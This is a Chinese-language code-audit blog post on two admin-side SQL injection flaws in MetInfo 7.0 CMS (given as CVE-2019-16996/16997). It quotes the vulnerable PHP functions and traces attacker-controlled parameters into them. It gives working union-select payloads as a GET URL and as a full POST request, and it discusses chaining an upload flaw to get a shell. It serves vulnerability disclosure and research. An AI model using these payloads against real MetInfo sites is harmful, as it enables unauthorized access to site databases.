---
title: "Metinfo7 后台注入及一些tips"
date: 2019-09-28T22:11:39+08:00
draft: false
tags: ['code']
categories: ['代码审计']
---

很可惜是个后台的注入

<!--more-->

跟汤姆表哥再搞创宇的年度任务🤒，昨天发了metinfo6.2.0的组合拳，今天看了看官网有最新版的7.0，就下下来看了看，发现两枚注入，而且昨天的组合拳虽然增加了后缀校验，绕不过去了，呜呜呜。

## sql injection 1

全局搜索`where`

app/system/parameter/include/class/parameter_op.class.php:165

```php
public function paratem($listid = '',$module = '',$class1 = '',$class2 = '',$class3 = ''){
    global $_M;

    $paralist = $this->get_para_list($module,$class1,$class2,$class3);
    foreach ($paralist as $key => $para) {
        $list = $this->parameter_database->get_parameters($module,$para['id']);
        $paralist[$key]['list'] = $list;
        if($para['type'] ==4 || $para['type'] ==2 || $para['type'] ==6){
            $values = array();
            foreach ($list as $val) {
                $query = "SELECT * FROM {$_M['table']['plist']} WHERE listid = {$listid} AND paraid={$para['id']} AND module={$module} AND info = '{$val['id']}' AND lang = '{$_M['lang']}'";
                $para_value = DB::get_one($query);
                if($para_value){
                    $values[] = $para_value['info'];
                }
            }
            $query = "SELECT * FROM {$_M['table']['plist']} WHERE listid = {$listid} AND paraid={$para['id']} AND module={$module} AND lang = '{$_M['lang']}'";
            $para_value = DB::get_one($query);
            $values = $para_value['info'];
        }else{
            $query = "SELECT * FROM {$_M['table']['plist']} WHERE listid = {$listid} AND paraid={$para['id']} AND module={$module} AND lang = '{$_M['lang']}'";
            $para_value = DB::get_one($query);
            $values = $para_value['info'];
        }


        if(is_array($values)){
            $paralist[$key]['value'] = implode('|', $values);
        }else{
            $paralist[$key]['value'] = $values;
        }
    }
    return $paralist;
    ##require PATH_WEB.'app/system/include/public/ui/admin/paratype.php';
}
```

发现`{$listid}`直接被拼接进sql语句，且`listid`是函数直接传进来的参数，搜索哪些函数调用了这个函数

![20190928221736](https://y4er.com/img/uploads/20190928221736.png)

app/system/product/admin/product_admin.class.php:171

```php
public function dopara() {
    global $_M;
    if($_M['form']['app_type']=='shop'){
        $class1 = $_M['form']['class1'];
        $class2 = $_M['form']['class2'];
        $class3 = $_M['form']['class3'];
        $paralist = $this->para_op->paratem($_M['form']['id'],$this->module,$class1,$class2,$class3);
        require PATH_WEB . 'app/system/include/public/ui/admin/paratype.php';
    }else{
        parent::dopara();
    }
}
```

`$_M['form']['id']`可控，那么sql语句就可控。

payload

```
http://php.local/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=2 union SELECT 1,2,3,user(),5,6,7 limit 5,1  -- +
```

## sql injection 2

app/system/language/admin/language_general.class.php:108

```php
public function doget_admin_pack($appno,$site,$editor)
{
    global $_M;
    $sql = $appno ? "AND app = {$appno}" : '';
    $language_data = array();
    if ($site == 'admin') {
        $query = "SELECT name,value FROM {$_M['table']['language']} WHERE lang='{$editor}' AND site ='1' {$sql}";
        $language_data = DB::get_all($query);
        $lang_pack_url = PATH_WEB . 'cache/language_admin_' . $editor . '.ini';
    } else if ($site == 'web') {
        $query = "SELECT name,value FROM {$_M['table']['language']} WHERE lang='{$editor}' AND site ='0' {$sql}";
        $language_data = DB::get_all($query);
        $lang_pack_url = PATH_WEB . 'cache/language_web_' . $editor . '.ini';
    }

    foreach ($language_data as $key => $val) {
        file_put_contents($lang_pack_url, $val['name'] . '=' . $val['value'] . PHP_EOL, FILE_APPEND);
    }
}
```

`$appno`直接拼接 当`site`等于web或者admin时造成sql注入

找下有没有调用这个函数传参的

app/system/language/admin/language_general.class.php:90

```php
public function doExportPack()
{
    global $_M;

    if (!isset($_M['form']['editor']) || !$_M['form']['editor']) {
        $this->error($_M['word']['js41']);
    }

    $editor = $_M['form']['editor'];
    $site = isset($_M['form']['site']) ? $_M['form']['site'] : '';
    $appno = $_M['form']['appno'] ? $_M['form']['appno'] : '';
    $filename = PATH_WEB . 'cache/language_' . $site . '_' . $editor . '.ini';

    delfile($filename);

    //获取后台语言包
    $this->doget_admin_pack($appno,$site,$editor);

    $filename = realpath($filename);
    header("");
    Header("Content-type:  application/octet-stream ");
    Header("Accept-Ranges:  bytes ");
    Header("Accept-Length: " . filesize($filename));
    header("Content-Disposition:  attachment;  filename=language_{$site}_" . $appno .'_'. $editor . ".ini");
    //写日志
    $log_name = $_M['form']['site'] ? 'langadmin' : 'langweb';
    logs::addAdminLog($log_name,'language_outputlang_v6','jsok','doExportPack');
    readfile($filename);
}
```

看下代码，首先要传递参数`editor`跳出第一个if语句块，然后`site`和`appno`直接传入`doget_admin_pack()`函数，参数都可控，妥妥的注入。

payload

```http
POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1
Host: php.local
Content-Length: 58
Origin: http://php.local
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=40d2af28a4c309bbb824dc957af59b11; arrlanguage=metinfo; re_url=http%3A%2F%2Fphp.local%2Fadmin%2F; met_auth=65acz4xG7IkP%2BqmPuO%2FIvPsKt4luK6Te34p%2F2BHXEosgKHUwk8dKQRHs7y4Ea9mCH1egudtuz%2Bl02L3eIhMLs7%2FDMw; met_key=PLBqK9J; page_iframe_url=http%3A%2F%2Fphp.local%2Findex.php%3Flang%3Dcn%26pageset%3D1
Connection: close

appno= 1 union SELECT user(),database()&editor=cn&site=web
```

![20190928223704](https://y4er.com/img/uploads/20190928223704.png)

## 组合拳

在前文中提到了metinfo6.2.0配合注入getshell的姿势，但是在metinfo7.0中增加了后缀校验，无法getshell，很可惜。

app/system/include/class/web.class.php:757

```php
if (stristr($filename, '.php')) {
    jsoncallback(array('suc' => 0));
}
```

但是这个点仍然可以上传其他后缀的文件，通过这个点配合解析漏洞或者文件包含来getshell未免不可行。

想到了htaccess和.user.ini的同学别费力气了，写文件没办法换行，如果有师傅有新姿势，欢迎评论指点啊！

## 总结

metinfo7.0的注入实际上还有很多，不过很多都是delete型的注入，我在这里挑了两个回显的注入，欢迎师傅们补充交流。

CVE-2019-16997
CVE-2019-16996

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**